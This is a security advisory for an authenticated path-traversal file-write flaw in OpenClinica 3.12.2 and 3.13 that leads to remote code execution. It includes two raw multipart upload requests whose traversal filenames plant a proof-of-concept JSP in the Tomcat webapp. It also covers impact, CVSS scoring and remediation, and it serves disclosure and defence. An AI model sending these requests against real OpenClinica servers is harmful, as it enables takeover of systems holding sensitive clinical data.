# OpenClinica Import CRF Data – Arbitrary file write → RCE (path traversal)

The Import CRF Data upload handler trusts the client-supplied `filename` and allows `../` traversal, enabling arbitrary file write. Dropping a JSP in the webapp leads to code execution.

---

## Product / Versions
- OpenClinica Community Edition  
  - **3.13** – Changeset `74f4df3481b6` (2017-02-28)  
  - **3.12.2** – Changeset `347dcfca3d17` (2016-11-21) (OpenClinica VM Image)

## Affected area
`Tasks → Import CRF Data` (multipart upload parameter: `xml_file`)

## Auth
Authenticated (tested as **Data Manager** and **Clinical Research Coordinator**)

## Summary
By crafting the multipart **`filename`** with path traversal, the server writes the uploaded body to an attacker-controlled path. Writing `shell.jsp` into the OpenClinica webapp results in **RCE** when the file is requested. Verified with both relative traversal into Tomcat’s deployed webapp and an absolute path to the Tomcat webapps dir on the vendor VM.

## Raw requests (abridged)

**Variant 1 – relative traversal into deployed app**
```
POST /OpenClinica/ImportCRFData?action=confirm HTTP/1.1
Host: <target>:8080
Content-Type: multipart/form-data; boundary=----X
Cookie: JSESSIONID=<...>

------X
Content-Disposition: form-data; name="xml_file"; filename="../webapps/OpenClinica/shell.jsp"
Content-Type: application/xml

<%-- JSP proof-of-execution payload --%><%= System.getProperty("user.name") %>
------X--
```

**Variant 2 – absolute path on typical Debian/Ubuntu Tomcat**
```
POST /OpenClinica/ImportCRFData?action=confirm HTTP/1.1
Host: <target>:8080
Content-Type: multipart/form-data; boundary=----X
Cookie: JSESSIONID=<...>

------X
Content-Disposition: form-data; name="xml_file"; filename="../../../../../../usr/share/tomcat/webapps/OpenClinica/shell.jsp"
Content-Type: application/xml

<%-- JSP proof-of-execution payload --%><%= System.getProperty("user.name") %>
------X--
```

Then browse to:
```
http://<target>:8080/OpenClinica/shell.jsp
```
A simple JSP demonstrated server-side execution as the application server’s OS user (on the vendor VM image this user was **root**, further amplifying impact).

## Impact
- Arbitrary file write on the host.
- Remote Code Execution in the context of the servlet container user.
- Full compromise of data and application integrity/availability.

## Severity (suggested)
**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` → **8.8 High**  
**CWE:** 22 (Path Traversal), 434 (Unrestricted File Upload)

## Remediation
- Never trust client `filename`; save to a fixed, non-web-served directory with a server-generated name.
- Reject `..`, path separators, and absolute paths. Enforce strict allow-list of extensions and content validation.
- Run Tomcat/OpenClinica as a **non-privileged** user and keep webroots **read-only** to that user; disable JSP execution if not required.

## Timeline
- **2025-10-09 → 2025-10-23**: Discovered and reproduced on 3.12.2 and 3.13 test images.  
- Evidence: Burp requests and shell session screenshots included.
